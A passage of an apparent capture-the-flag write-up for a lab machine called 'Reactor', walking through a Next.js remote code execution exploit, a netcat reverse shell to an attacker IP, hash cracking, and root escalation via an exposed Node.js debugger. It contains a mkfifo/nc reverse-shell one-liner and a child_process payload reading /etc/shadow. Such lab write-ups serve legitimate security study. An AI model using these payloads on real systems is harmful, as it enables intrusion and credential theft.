So, we have SSH running on port 22 and a web application running on port 3000.

![Image]({{ '/assets/img/reactor/image_2.png' | relative_url }})

After some searching and directory fuzzing, I didn't find anything useful on the web application. However, Wappalyzer showed that it was built with Next.js 15.0.3.

![Image]({{ '/assets/img/reactor/image_3.png' | relative_url }})

### Exploitation

So, I searched for Next.js exploits and found CVE-2025-55182, also known as "React2Shell". It is a remote code execution vulnerability affecting certain versions of Next.js.

After some more searching, I found a Python exploit for it on [GitHub](https://github.com/jedisct1/react2shell-exploit).

I downloaded the exploit and ran it, as shown below:
![Image]({{ '/assets/img/reactor/image_4.png' | relative_url }})

So, I used this payload to get a reverse shell with Netcat:

```shell
python3 exploit.py http://10.129.108.152:3000 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.46 1234 >/tmp/f"
```

![Image]({{ '/assets/img/reactor/image_5.png' | relative_url }})

After getting a reverse shell, I used these commands to upgrade it to a more interactive shell:

```shell
/usr/bin/script -qc /bin/bash /dev/null
export TERM=xterm
```
After that, I noticed a file called `reactor.db`, so I tried to read it.
![Image]({{ '/assets/img/reactor/image_6.png' | relative_url }})

From this file, I found that it was an SQLite database with a table called `users`. I dumped the table's contents and got the following:

![Image]({{ '/assets/img/reactor/image_7.png' | relative_url }})

I found these hashes in the database, so I saved them to `hashes.txt` and used John the Ripper to crack them.

![Image]({{ '/assets/img/reactor/image_8.png' | relative_url }})

I then got these credentials: `engineer:reactor1`. I used them to SSH into the machine and successfully retrieved the user flag.


![Image]({{ '/assets/img/reactor/image_9.png' | relative_url }})

### Privilege Escalation

After searching, I found a Node.js process running with debugging enabled.

![Image]({{ '/assets/img/reactor/image_10.png' | relative_url }})

The Node inspector interface allows remote debugging of live Node.js processes. If accessible locally, it effectively provides JavaScript execution inside the target process.

Since the Node.js process runs as root, this becomes a direct privilege escalation vector.

So, I tried to connect to the Node.js debugger using this command, and it worked:
```shell
node inspect --port=9229
```
Once connected, I could evaluate arbitrary JavaScript. I tried this payload to see if I could read files, and it worked:
```shell
exec("process.mainModule.require('child_process').execSync('cat /etc/shadow').toString()")
```

![Image]({{ '/assets/img/reactor/image_12.png' | relative_url }})


So, I retrieved the root flag.
